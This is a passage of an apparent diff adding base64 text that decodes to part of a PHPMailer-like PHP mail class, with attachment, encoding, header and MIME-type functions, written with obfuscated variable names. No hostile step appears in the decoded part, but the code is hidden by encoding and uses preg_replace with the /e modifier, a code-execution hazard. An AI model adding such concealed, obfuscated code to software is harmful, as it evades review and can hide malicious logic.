+ICR4YjAgPT0gNDYgKSB7CgkJCQkkeGQ0ID0gJz0yRSc7CgkJCSAgfQoJCQl9CgkJCSR4ZDMgLj0g
+JHhkNDsKCQkgIH0gLy8gZW5kIG9mIGZvcgoJCSAgJHhkMSAuPSAkeGQzLiR4Y2Y7CgkJfSAvLyBl
+bmQgb2Ygd2hpbGUKCQlyZXR1cm4gdHJpbSgkeGQxKTsKCSAgfQoKCSAgLyoqCgkgICAqIEVuY29k
+ZSBzdHJpbmcgdG8gcSBlbmNvZGluZy4KCSAgICogQGFjY2VzcyBwcml2YXRlCgkgICAqIEByZXR1
+cm4gc3RyaW5nCgkgICAqLwoJICBmdW5jdGlvbiBFbmNvZGVRICgkeDEyLCAkeGMxID0gJ3RleHQn
+KSB7CgkJLyogVGhlcmUgc2hvdWxkIG5vdCBiZSBhbnkgRU9MIGluIHRoZSBzdHJpbmcgKi8KCQkk
+eGMwID0gcHJlZ19yZXBsYWNlKCJbXHJcbl0iLCAnJywgJHgxMik7CgoJCXN3aXRjaCAoc3RydG9s
+b3dlcigkeGMxKSkgewoJCSAgY2FzZSAncGhyYXNlJzoKCQkJJHhjMCA9IHByZWdfcmVwbGFjZSgi
+LyhbXkEtWmEtejAtOSEqK1wvIC1dKS9lIiwgIic9Jy5zcHJpbnRmKCclMDJYJywgb3JkKCdcXDEn
+KSkiLCAkeGMwKTsKCQkJYnJlYWs7CgkJICBjYXNlICdjb21tZW50JzoKCQkJJHhjMCA9IHByZWdf
+cmVwbGFjZSgiLyhbXChcKVwiXSkvZSIsICInPScuc3ByaW50ZignJTAyWCcsIG9yZCgnXFwxJykp
+IiwgJHhjMCk7CgkJICBjYXNlICd0ZXh0JzoKCQkgIGRlZmF1bHQ6CgkJCS8qIFJlcGxhY2UgZXZl
+cnkgaGlnaCBhc2NpaSwgY29udHJvbCA9LCA/IGFuZCBfIGNoYXJhY3RlcnMgKi8KCQkJJHhjMCA9
+IHByZWdfcmVwbGFjZSgnLyhbXDAwMC1cMDExXDAxM1wwMTRcMDE2LVwwMzdcMDc1XDA3N1wxMzdc
+MTc3LVwzNzddKS9lJywKCQkJCSAgIic9Jy5zcHJpbnRmKCclMDJYJywgb3JkKCdcXDEnKSkiLCAk
+eGMwKTsKCQkJYnJlYWs7CgkJfQoKCQkvKiBSZXBsYWNlIGV2ZXJ5IHNwYWNlcyB0byBfIChtb3Jl
+IHJlYWRhYmxlIHRoYW4gPTIwKSAqLwoJCSR4YzAgPSBzdHJfcmVwbGFjZSgnICcsICdfJywgJHhj
+MCk7CgoJCXJldHVybiAkeGMwOwoJICB9CgoJICAvKioKCSAgICogQWRkcyBhIHN0cmluZyBvciBi
+aW5hcnkgYXR0YWNobWVudCAobm9uLWZpbGVzeXN0ZW0pIHRvIHRoZSBsaXN0LgoJICAgKiBUaGlz
+IG1ldGhvZCBjYW4gYmUgdXNlZCB0byBhdHRhY2ggYXNjaWkgb3IgYmluYXJ5IGRhdGEsCgkgICAq
+IHN1Y2ggYXMgYSBCTE9CIHJlY29yZCBmcm9tIGEgZGF0YWJhc2UuCgkgICAqIEBwYXJhbSBzdHJp
+bmcgJHgxNSBTdHJpbmcgYXR0YWNobWVudCBkYXRhLgoJICAgKiBAcGFyYW0gc3RyaW5nICR4Yjgg
+TmFtZSBvZiB0aGUgYXR0YWNobWVudC4KCSAgICogQHBhcmFtIHN0cmluZyAkeGI2IEZpbGUgZW5j
+b2RpbmcgKHNlZSAkeDVjKS4KCSAgICogQHBhcmFtIHN0cmluZyAkeDlhIEZpbGUgZXh0ZW5zaW9u
+IChNSU1FKSB0eXBlLgoJICAgKiBAcmV0dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIEFkZFN0
+cmluZ0F0dGFjaG1lbnQoJHgxNSwgJHhiOCwgJHhiNiA9ICdiYXNlNjQnLCAkeDlhID0gJ2FwcGxp
+Y2F0aW9uL29jdGV0LXN0cmVhbScpIHsKCQkvKiBBcHBlbmQgdG8gJHg3YiBhcnJheSAqLwoJCSR4
+ODYgPSBjb3VudCgkdGhpcy0+YXR0YWNobWVudCk7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1b
+MF0gPSAkeDE1OwoJCSR0aGlzLT5hdHRhY2htZW50WyR4ODZdWzFdID0gJHhiODsKCQkkdGhpcy0+
+YXR0YWNobWVudFskeDg2XVsyXSA9ICR4Yjg7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1bM10g
+PSAkeGI2OwoJCSR0aGlzLT5hdHRhY2htZW50WyR4ODZdWzRdID0gJHg5YTsKCQkkdGhpcy0+YXR0
+YWNobWVudFskeDg2XVs1XSA9IHRydWU7IC8vIGlzU3RyaW5nCgkJJHRoaXMtPmF0dGFjaG1lbnRb
+JHg4Nl1bNl0gPSAnYXR0YWNobWVudCc7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1bN10gPSAw
+OwoJICB9CgoJICAvKioKCSAgICogQWRkcyBhbiBlbWJlZGRlZCBhdHRhY2htZW50LiAgVGhpcyBj
+YW4gaW5jbHVkZSBpbWFnZXMsIHNvdW5kcywgYW5kCgkgICAqIGp1c3QgYWJvdXQgYW55IG90aGVy
+IGRvY3VtZW50LiAgTWFrZSBzdXJlIHRvIHNldCB0aGUgJHg5YSB0byBhbgoJICAgKiBpbWFnZSB0
+eXBlLiAgRm9yIEpQRUcgaW1hZ2VzIHVzZSAiaW1hZ2UvanBlZyIgYW5kIGZvciBHSUYgaW1hZ2Vz
+CgkgICAqIHVzZSAiaW1hZ2UvZ2lmIi4KCSAgICogQHBhcmFtIHN0cmluZyAkeGI3IFBhdGggdG8g
+dGhlIGF0dGFjaG1lbnQuCgkgICAqIEBwYXJhbSBzdHJpbmcgJHhiYyBDb250ZW50IElEIG9mIHRo
+ZSBhdHRhY2htZW50LiAgVXNlIHRoaXMgdG8gaWRlbnRpZnkKCSAgICogICAgICAgIHRoZSBJZCBm
+b3IgYWNjZXNzaW5nIHRoZSBpbWFnZSBpbiBhbiBIVE1MIGZvcm0uCgkgICAqIEBwYXJhbSBzdHJp
+bmcgJHg0OCBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4KCSAgICogQHBhcmFtIHN0cmlu
+ZyAkeGI2IEZpbGUgZW5jb2RpbmcgKHNlZSAkeDVjKS4KCSAgICogQHBhcmFtIHN0cmluZyAkeDlh
+IEZpbGUgZXh0ZW5zaW9uIChNSU1FKSB0eXBlLgoJICAgKiBAcmV0dXJuIGJvb2wKCSAgICovCgkg
+IGZ1bmN0aW9uIEFkZEVtYmVkZGVkSW1hZ2UoJHhiNywgJHhiYywgJHg0OCA9ICcnLCAkeGI2ID0g
+J2Jhc2U2NCcsICR4OWEgPSAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJykgewoKCQlpZighQGlz
+X2ZpbGUoJHhiNykpIHsKCQkgICR0aGlzLT5TZXRFcnJvcigkdGhpcy0+TGFuZygnZmlsZV9hY2Nl
+c3MnKSAuICR4YjcpOwoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJJHhiOCA9IGJhc2VuYW1lKCR4
+YjcpOwoJCWlmKCR4NDggPT0gJycpIHsKCQkgICR4NDggPSAkeGI4OwoJCX0KCgkJLyogQXBwZW5k
+IHRvICR4N2IgYXJyYXkgKi8KCQkkeDg2ID0gY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpOwoJCSR0
+aGlzLT5hdHRhY2htZW50WyR4ODZdWzBdID0gJHhiNzsKCQkkdGhpcy0+YXR0YWNobWVudFskeDg2
+XVsxXSA9ICR4Yjg7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1bMl0gPSAkeDQ4OwoJCSR0aGlz
+LT5hdHRhY2htZW50WyR4ODZdWzNdID0gJHhiNjsKCQkkdGhpcy0+YXR0YWNobWVudFskeDg2XVs0
+XSA9ICR4OWE7CgkJJHRoaXMtPmF0dGFjaG1lbnRbJHg4Nl1bNV0gPSBmYWxzZTsKCQkkdGhpcy0+
+YXR0YWNobWVudFskeDg2XVs2XSA9ICdpbmxpbmUnOwoJCSR0aGlzLT5hdHRhY2htZW50WyR4ODZd
+WzddID0gJHhiYzsKCgkJcmV0dXJuIHRydWU7CgkgIH0KCgkgIC8qKgoJICAgKiBSZXR1cm5zIHRy
+dWUgaWYgYW4gaW5saW5lIGF0dGFjaG1lbnQgaXMgcHJlc2VudC4KCSAgICogQGFjY2VzcyBwcml2
+YXRlCgkgICAqIEByZXR1cm4gYm9vbAoJICAgKi8KCSAgZnVuY3Rpb24gSW5saW5lSW1hZ2VFeGlz
+dHMoKSB7CgkJJHg4OSA9IGZhbHNlOwoJCWZvcigkeDhjID0gMDsgJHg4YyA8IGNvdW50KCR0aGlz
+LT5hdHRhY2htZW50KTsgJHg4YysrKSB7CgkJICBpZigkdGhpcy0+YXR0YWNobWVudFskeDhjXVs2
+XSA9PSAnaW5saW5lJykgewoJCQkkeDg5ID0gdHJ1ZTsKCQkJYnJlYWs7CgkJICB9CgkJfQoKCQly
+ZXR1cm4gJHg4OTsKCSAgfQoKCSAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLwoJICAvLyBDTEFTUyBNRVRIT0RTLCBNRVNTQUdFIFJFU0VUCgkgIC8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCgkgIC8qKgoJICAg
+KiBDbGVhcnMgYWxsIHJlY2lwaWVudHMgYXNzaWduZWQgaW4gdGhlIFRPIGFycmF5LiAgUmV0dXJu
+cyB2b2lkLgoJICAgKiBAcmV0dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIENsZWFyQWRkcmVz
+c2VzKCkgewoJCSR0aGlzLT50byA9IGFycmF5KCk7CgkgIH0KCgkgIC8qKgoJICAgKiBDbGVhcnMg
+YWxsIHJlY2lwaWVudHMgYXNzaWduZWQgaW4gdGhlIENDIGFycmF5LiAgUmV0dXJucyB2b2lkLgoJ
+ICAgKiBAcmV0dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIENsZWFyQ0NzKCkgewoJCSR0aGlz
+LT5jYyA9IGFycmF5KCk7CgkgIH0KCgkgIC8qKgoJICAgKiBDbGVhcnMgYWxsIHJlY2lwaWVudHMg
+YXNzaWduZWQgaW4gdGhlIEJDQyBhcnJheS4gIFJldHVybnMgdm9pZC4KCSAgICogQHJldHVybiB2
+b2lkCgkgICAqLwoJICBmdW5jdGlvbiBDbGVhckJDQ3MoKSB7CgkJJHRoaXMtPmJjYyA9IGFycmF5
+KCk7CgkgIH0KCgkgIC8qKgoJICAgKiBDbGVhcnMgYWxsIHJlY2lwaWVudHMgYXNzaWduZWQgaW4g
+dGhlIFJlcGx5VG8gYXJyYXkuICBSZXR1cm5zIHZvaWQuCgkgICAqIEByZXR1cm4gdm9pZAoJICAg
+Ki8KCSAgZnVuY3Rpb24gQ2xlYXJSZXBseVRvcygpIHsKCQkkdGhpcy0+UmVwbHlUbyA9IGFycmF5
+KCk7CgkgIH0KCgkgIC8qKgoJICAgKiBDbGVhcnMgYWxsIHJlY2lwaWVudHMgYXNzaWduZWQgaW4g
+dGhlIFRPLCBDQyBhbmQgQkNDCgkgICAqIGFycmF5LiAgUmV0dXJucyB2b2lkLgoJICAgKiBAcmV0
+dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIENsZWFyQWxsUmVjaXBpZW50cygpIHsKCQkkdGhp
+cy0+dG8gPSBhcnJheSgpOwoJCSR0aGlzLT5jYyA9IGFycmF5KCk7CgkJJHRoaXMtPmJjYyA9IGFy
+cmF5KCk7CgkgIH0KCgkgIC8qKgoJICAgKiBDbGVhcnMgYWxsIHByZXZpb3VzbHkgc2V0IGZpbGVz
+eXN0ZW0sIHN0cmluZywgYW5kIGJpbmFyeQoJICAgKiBhdHRhY2htZW50cy4gIFJldHVybnMgdm9p
+ZC4KCSAgICogQHJldHVybiB2b2lkCgkgICAqLwoJICBmdW5jdGlvbiBDbGVhckF0dGFjaG1lbnRz
+KCkgewoJCSR0aGlzLT5hdHRhY2htZW50ID0gYXJyYXkoKTsKCSAgfQoKCSAgLyoqCgkgICAqIENs
+ZWFycyBhbGwgY3VzdG9tIGhlYWRlcnMuICBSZXR1cm5zIHZvaWQuCgkgICAqIEByZXR1cm4gdm9p
+ZAoJICAgKi8KCSAgZnVuY3Rpb24gQ2xlYXJDdXN0b21IZWFkZXJzKCkgewoJCSR0aGlzLT5DdXN0
+b21IZWFkZXIgPSBhcnJheSgpOwoJICB9CgoJICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vCgkgIC8vIENMQVNTIE1FVEhPRFMsIE1JU0NFTExBTkVPVVMK
+CSAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKCSAg
+LyoqCgkgICAqIEFkZHMgdGhlIGVycm9yIG1lc3NhZ2UgdG8gdGhlIGVycm9yIGNvbnRhaW5lci4K
+CSAgICogUmV0dXJucyB2b2lkLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICogQHJldHVybiB2
+b2lkCgkgICAqLwoJICBmdW5jdGlvbiBTZXRFcnJvcigkeGQ3KSB7CgkJJHRoaXMtPmVycm9yX2Nv
+dW50Kys7CgkJJHRoaXMtPkVycm9ySW5mbyA9ICR4ZDc7CgkgIH0KCgkgIC8qKgoJICAgKiBSZXR1
+cm5zIHRoZSBwcm9wZXIgUkZDIDgyMiBmb3JtYXR0ZWQgZGF0ZS4KCSAgICogQGFjY2VzcyBwcml2
+YXRlCgkgICAqIEByZXR1cm4gc3RyaW5nCgkgICAqLwoJICBmdW5jdGlvbiBSRkNEYXRlKCkgewoJ
+CSR4ZDggPSBkYXRlKCdaJyk7CgkJJHhkOSA9ICgkeGQ4IDwgMCkgPyAnLScgOiAnKyc7CgkJJHhk
+OCA9IGFicygkeGQ4KTsKCQkkeGQ4ID0gKGludCkoJHhkOC8zNjAwKSoxMDAgKyAoJHhkOCUzNjAw
+KS82MDsKCQkkeDg5ID0gc3ByaW50ZigiJXMgJXMlMDRkIiwgZGF0ZSgnRCwgaiBNIFkgSDppOnMn
+KSwgJHhkOSwgJHhkOCk7CgoJCXJldHVybiAkeDg5OwoJICB9CgoJICAvKioKCSAgICogUmV0dXJu
+cyB0aGUgYXBwcm9wcmlhdGUgc2VydmVyIHZhcmlhYmxlLiAgU2hvdWxkIHdvcmsgd2l0aCBib3Ro
+CgkgICAqIFBIUCA0LjEuMCsgYXMgd2VsbCBhcyBvbGRlciB2ZXJzaW9ucy4gIFJldHVybnMgYW4g
+ZW1wdHkgc3RyaW5nCgkgICAqIGlmIG5vdGhpbmcgaXMgZm91bmQuCgkgICAqIEBhY2Nlc3MgcHJp
+dmF0ZQoJICAgKiBAcmV0dXJuIG1peGVkCgkgICAqLwoJICBmdW5jdGlvbiBTZXJ2ZXJWYXIoJHhk
+YSkgewoJCWdsb2JhbCAkeGRiOwoJCWdsb2JhbCAkeGRjOwoKCQlpZighaXNzZXQoJF9TRVJWRVIp
+KSB7CgkJICAkX1NFUlZFUiA9ICR4ZGI7CgkJICBpZighaXNzZXQoJF9TRVJWRVJbJ1JFTU9URV9B
+RERSJ10pKSB7CgkJCSRfU0VSVkVSID0gJHhkYzsgLy8gbXVzdCBiZSBBcGFjaGUKCQkgIH0KCQl9
+CgoJCWlmKGlzc2V0KCRfU0VSVkVSWyR4ZGFdKSkgewoJCSAgcmV0dXJuICRfU0VSVkVSWyR4ZGFd
+OwoJCX0gZWxzZSB7CgkJICByZXR1cm4gJyc7CgkJfQoJICB9CgoJICAvKioKCSAgICogUmV0dXJu
+cyB0aGUgc2VydmVyIGhvc3RuYW1lIG9yICdsb2NhbGhvc3QubG9jYWxkb21haW4nIGlmIHVua25v
+d24uCgkgICAqIEBhY2Nlc3MgcHJpdmF0ZQoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAgKi8KCSAg
+ZnVuY3Rpb24gU2VydmVySG9zdG5hbWUoKSB7CgkJaWYgKCR0aGlzLT5Ib3N0bmFtZSAhPSAnJykg
+ewoJCSAgJHg4OSA9ICR0aGlzLT5Ib3N0bmFtZTsKCQl9IGVsc2VpZiAoJHRoaXMtPlNlcnZlclZh
+cignU0VSVkVSX05BTUUnKSAhPSAnJykgewoJCSAgJHg4OSA9ICR0aGlzLT5TZXJ2ZXJWYXIoJ1NF
+UlZFUl9OQU1FJyk7CgkJfSBlbHNlIHsKCQkgICR4ODkgPSAnbG9jYWxob3N0LmxvY2FsZG9tYWlu
+JzsKCQl9CgoJCXJldHVybiAkeDg5OwoJICB9CgoJICAvKioKCSAgICogUmV0dXJucyBhIG1lc3Nh
+Z2UgaW4gdGhlIGFwcHJvcHJpYXRlIGxhbmd1YWdlLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAg
+ICogQHJldHVybiBzdHJpbmcKCSAgICovCgkgIGZ1bmN0aW9uIExhbmcoJHgxMykgewoJCWlmKGNv
+dW50KCR0aGlzLT5sYW5ndWFnZSkgPCAxKSB7CgkJICAkdGhpcy0+U2V0TGFuZ3VhZ2UoJ2VuJyk7
+IC8vIHNldCB0aGUgZGVmYXVsdCBsYW5ndWFnZQoJCX0KCgkJaWYoaXNzZXQoJHRoaXMtPmxhbmd1
+YWdlWyR4MTNdKSkgewoJCSAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVskeDEzXTsKCQl9IGVsc2Ug
+ewoJCSAgcmV0dXJuICdMYW5ndWFnZSBzdHJpbmcgZmFpbGVkIHRvIGxvYWQ6ICcgLiAkeDEzOwoJ
+CX0KCSAgfQoKCSAgLyoqCgkgICAqIFJldHVybnMgdHJ1ZSBpZiBhbiBlcnJvciBvY2N1cnJlZC4K
+CSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBJc0Vycm9yKCkgewoJCXJldHVy
+biAoJHRoaXMtPmVycm9yX2NvdW50ID4gMCk7CgkgIH0KCgkgIC8qKgoJICAgKiBDaGFuZ2VzIGV2
+ZXJ5IGVuZCBvZiBsaW5lIGZyb20gQ1Igb3IgTEYgdG8gQ1JMRi4KCSAgICogQGFjY2VzcyBwcml2
+YXRlCgkgICAqIEByZXR1cm4gc3RyaW5nCgkgICAqLwoJICBmdW5jdGlvbiBGaXhFT0woJHgxMikg
+ewoJCSR4MTIgPSBzdHJfcmVwbGFjZSgiXHJcbiIsICJcbiIsICR4MTIpOwoJCSR4MTIgPSBzdHJf
+cmVwbGFjZSgiXHIiLCAiXG4iLCAkeDEyKTsKCQkkeDEyID0gc3RyX3JlcGxhY2UoIlxuIiwgJHRo
+aXMtPkxFLCAkeDEyKTsKCQlyZXR1cm4gJHgxMjsKCSAgfQoKCSAgLyoqCgkgICAqIEFkZHMgYSBj
+dXN0b20gaGVhZGVyLgoJICAgKiBAcmV0dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIEFkZEN1
+c3RvbUhlYWRlcigkeGRkKSB7CgkJJHRoaXMtPkN1c3RvbUhlYWRlcltdID0gZXhwbG9kZSgnOics
+ICR4ZGQsIDIpOwoJICB9CgoJICAvKioKCSAgICogRXZhbHVhdGVzIHRoZSBtZXNzYWdlIGFuZCBy
+ZXR1cm5zIG1vZGlmaWNhdGlvbnMgZm9yIGlubGluZSBpbWFnZXMgYW5kIGJhY2tncm91bmRzCgkg
+ICAqIEBhY2Nlc3MgcHVibGljCgkgICAqIEByZXR1cm4gJHgxOQoJICAgKi8KCSAgZnVuY3Rpb24g
+TXNnSFRNTCgkeDE5LCR4ZGU9JycpIHsKCQlwcmVnX21hdGNoX2FsbCgiLyhzcmN8YmFja2dyb3Vu
+ZCk9XCIoLiopXCIvVWkiLCAkeDE5LCAkeGRmKTsKCQlpZihpc3NldCgkeGRmWzJdKSkgewoJCSAg
+Zm9yZWFjaCgkeGRmWzJdIGFzICR4OGMgPT4gJHgwZikgewoJCQkvLyBkbyBub3QgY2hhbmdlIHVy
+bHMgZm9yIGFic29sdXRlIGltYWdlcyAodGhhbmtzIHRvIGNvcnZ1c2NvcmF4KQoJCQlpZiAoIXBy
+ZWdfbWF0Y2goJy9eW0Etel1bQS16XSo6XC9cLy8nLCR4MGYpKSB7CgkJCSAgJHhiOCA9IGJhc2Vu
+YW1lKCR4MGYpOwoJCQkgICR4ZTAgPSBkaXJuYW1lKCR4MGYpOwoJCQkgICgkeGUwID09ICcuJyk/
+JHhlMD0nJzonJzsKCQkJICAkeGJjID0gJ2NpZDonIC4gbWQ1KCR4YjgpOwoJCQkgICR4ZTEgPSBz
+cGxpdCgiXC4iLCAkeGI4KTsKCQkJICAkeGUyID0gJHhlMVsxXTsKCQkJICAkeGUzID0gJHRoaXMt
+Pl9taW1lX3R5cGVzKCR4ZTIpOwoJCQkgIGlmICggc3RybGVuKCR4ZGUpID4gMSAmJiBzdWJzdHIo
+JHhkZSwtMSkgIT0gJy8nKSB7ICR4ZGUgLj0gJy8nOyB9CgkJCSAgaWYgKCBzdHJsZW4oJHhlMCkg
+PiAxICYmIHN1YnN0cigkeGRlLC0xKSAhPSAnLycpIHsgJHhlMCAuPSAnLyc7IH0KCQkJICAkdGhp
+cy0+QWRkRW1iZWRkZWRJbWFnZSgkeGRlLiR4ZTAuJHhiOCwgbWQ1KCR4YjgpLCAkeGI4LCAnYmFz
+ZTY0JywgJHhlMyk7CgkJCSAgaWYgKCAkdGhpcy0+QWRkRW1iZWRkZWRJbWFnZSgkeGRlLiR4ZTAu
+JHhiOCwgbWQ1KCR4YjgpLCAkeGI4LCAnYmFzZTY0JywkeGUzKSApIHsKCQkJCSR4MTkgPSBwcmVn
+X3JlcGxhY2UoIi8iLiR4ZGZbMV1bJHg4Y10uIj1cIiIucHJlZ19xdW90ZSgkeDBmLCAnLycpLiJc
+Ii9VaSIsICR4ZGZbMV1bJHg4Y10uIj1cIiIuJHhiYy4iXCIiLCAkeDE5KTsKCQkJICB9CgkJCX0K
+CQkgIH0KCQl9CgkJJHRoaXMtPklzSFRNTCh0cnVlKTsKCQkkdGhpcy0+Qm9keSA9ICR4MTk7CgkJ
+JHhlNCA9IHRyaW0oc3RyaXBfdGFncyhwcmVnX3JlcGxhY2UoJy88KGhlYWR8dGl0bGV8c3R5bGV8
+c2NyaXB0KVtePl0qPi4qPzxcL1xcMT4vcycsJycsJHgxOSkpKTsKCQlpZiAoICFlbXB0eSgkeGU0
+KSAmJiBlbXB0eSgkdGhpcy0+QWx0Qm9keSkgKSB7CgkJICAkdGhpcy0+QWx0Qm9keSA9ICR4ZTQ7
+CgkJfQoJCWlmICggZW1wdHkoJHRoaXMtPkFsdEJvZHkpICkgewoJCSAgJHRoaXMtPkFsdEJvZHkg
+PSAnVG8gdmlldyB0aGlzIGVtYWlsIG1lc3NhZ2UsIG9wZW4gdGhlIGVtYWlsIGluIHdpdGggSFRN
+TCBjb21wYXRpYmlsaXR5IScgLiAiXG5cbiI7CgkJfQoJICB9CgoJICAvKioKCSAgICogR2V0cyB0
+aGUgbWltZSB0eXBlIG9mIHRoZSBlbWJlZGRlZCBvciBpbmxpbmUgaW1hZ2UKCSAgICogQGFjY2Vz
+cyBwcml2YXRlCgkgICAqIEByZXR1cm4gbWltZSB0eXBlIG9mIGV4dAoJICAgKi8KCSAgZnVuY3Rp
+b24gX21pbWVfdHlwZXMoJHhlMiA9ICcnKSB7CgkJJHhlNSA9IGFycmF5KAoJCSAgJ2hxeCcgID0+
+ICAnYXBwbGljYXRpb24vbWFjLWJpbmhleDQwJywKCQkgICdjcHQnICAgPT4gICdhcHBsaWNhdGlv
+bi9tYWMtY29tcGFjdHBybycsCgkJICAnZG9jJyAgID0+ICAnYXBwbGljYXRpb24vbXN3b3JkJywK
+CQkgICdiaW4nICAgPT4gICdhcHBsaWNhdGlvbi9tYWNiaW5hcnknLAoJCSAgJ2RtcycgICA9PiAg
+J2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCgkJICAnbGhhJyAgID0+ICAnYXBwbGljYXRpb24v
+b2N0ZXQtc3RyZWFtJywKCQkgICdsemgnICAgPT4gICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0n
+LAoJCSAgJ2V4ZScgICA9PiAgJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCgkJICAnY2xhc3Mn
+ID0+ICAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKCQkgICdwc2QnICAgPT4gICdhcHBsaWNh
+dGlvbi9vY3RldC1zdHJlYW0nLAoJCSAgJ3NvJyAgICA9PiAgJ2FwcGxpY2F0aW9uL29jdGV0LXN0
+cmVhbScsCgkJICAnc2VhJyAgID0+ICAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKCQkgICdk
+bGwnICAgPT4gICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAoJCSAgJ29kYScgICA9PiAgJ2Fw
+cGxpY2F0aW9uL29kYScsCgkJICAncGRmJyAgID0+ICAnYXBwbGljYXRpb24vcGRmJywKCQkgICdh
+aScgICAgPT4gICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKCQkgICdlcHMnICAgPT4gICdhcHBs
+aWNhdGlvbi9wb3N0c2NyaXB0JywKCQkgICdwcycgICAgPT4gICdhcHBsaWNhdGlvbi9wb3N0c2Ny
+aXB0JywKCQkgICdzbWknICAgPT4gICdhcHBsaWNhdGlvbi9zbWlsJywKCQkgICdzbWlsJyAgPT4g
+ICdhcHBsaWNhdGlvbi9zbWlsJywKCQkgICdtaWYnICAgPT4gICdhcHBsaWNhdGlvbi92bmQubWlm
+JywKCQkgICd4bHMnICAgPT4gICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLAoJCSAgJ3BwdCcg
+ICA9PiAgJ2FwcGxpY2F0aW9uL3ZuZC5tcy1wb3dlcnBvaW50JywKCQkgICd3YnhtbCcgPT4gICdh
+cHBsaWNhdGlvbi92bmQud2FwLndieG1sJywKCQkgICd3bWxjJyAgPT4gICdhcHBsaWNhdGlvbi92
+bmQud2FwLndtbGMnLAoJCSAgJ2RjcicgICA9PiAgJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAoJ
+CSAgJ2RpcicgICA9PiAgJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAoJCSAgJ2R4cicgICA9PiAg
+J2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAoJCSAgJ2R2aScgICA9PiAgJ2FwcGxpY2F0aW9uL3gt
+ZHZpJywKCQkgICdndGFyJyAgPT4gICdhcHBsaWNhdGlvbi94LWd0YXInLAoJCSAgJ3BocCcgICA9
+PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKCQkgICdwaHA0JyAgPT4gICdhcHBsaWNhdGlv
+bi94LWh0dHBkLXBocCcsCgkJICAncGhwMycgID0+ICAnYXBwbGljYXRpb24veC1odHRwZC1waHAn
+LAoJCSAgJ3BodG1sJyA9PiAgJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKCQkgICdwaHBzJyAg
+PT4gICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocC1zb3VyY2UnLAoJCSAgJ2pzJyAgICA9PiAgJ2Fw
+cGxpY2F0aW9uL3gtamF2YXNjcmlwdCcsCgkJICAnc3dmJyAgID0+ICAnYXBwbGljYXRpb24veC1z
+aG9ja3dhdmUtZmxhc2gnLAoJCSAgJ3NpdCcgICA9PiAgJ2FwcGxpY2F0aW9uL3gtc3R1ZmZpdCcs
+CgkJICAndGFyJyAgID0+ICAnYXBwbGljYXRpb24veC10YXInLAoJCSAgJ3RneicgICA9PiAgJ2Fw
+cGxpY2F0aW9uL3gtdGFyJywKCQkgICd4aHRtbCcgPT4gICdhcHBsaWNhdGlvbi94aHRtbCt4bWwn
+LAoJCSAgJ3hodCcgICA9PiAgJ2FwcGxpY2F0aW9uL3hodG1sK3htbCcsCgkJICAnemlwJyAgID0+
+ICAnYXBwbGljYXRpb24vemlwJywKCQkgICdtaWQnICAgPT4gICdhdWRpby9taWRpJywKCQkgICdt
+aWRpJyAgPT4gICdhdWRpby9taWRpJywKCQkgICdtcGdhJyAgPT4gICdhdWRpby9tcGVnJywKCQkg
+ICdtcDInICAgPT4gICdhdWRpby9tcGVnJywKCQkgICdtcDMnICAgPT4gICdhdWRpby9tcGVnJywK
+CQkgICdhaWYnICAgPT4gICdhdWRpby94LWFpZmYnLAoJCSAgJ2FpZmYnICA9PiAgJ2F1ZGlvL3gt
+YWlmZicsCgkJICAnYWlmYycgID0+ICAnYXVkaW8veC1haWZmJywKCQkgICdyYW0nICAgPT4gICdh
+dWRpby94LXBuLXJlYWxhdWRpbycsCgkJICAncm0nICAgID0+ICAnYXVkaW8veC1wbi1yZWFsYXVk
+aW8nLAoJCSAgJ3JwbScgICA9PiAgJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvLXBsdWdpbicsCgkJICAn
+cmEnICAgID0+ICAnYXVkaW8veC1yZWFsYXVkaW8nLAoJCSAgJ3J2JyAgICA9PiAgJ3ZpZGVvL3Zu
+ZC5ybi1yZWFsdmlkZW8nLAoJCSAgJ3dhdicgICA9PiAgJ2F1ZGlvL3gtd2F2JywKCQkgICdibXAn
+ICAgPT4gICdpbWFnZS9ibXAnLAoJCSAgJ2dpZicgICA9PiAgJ2ltYWdlL2dpZicsCgkJICAnanBl
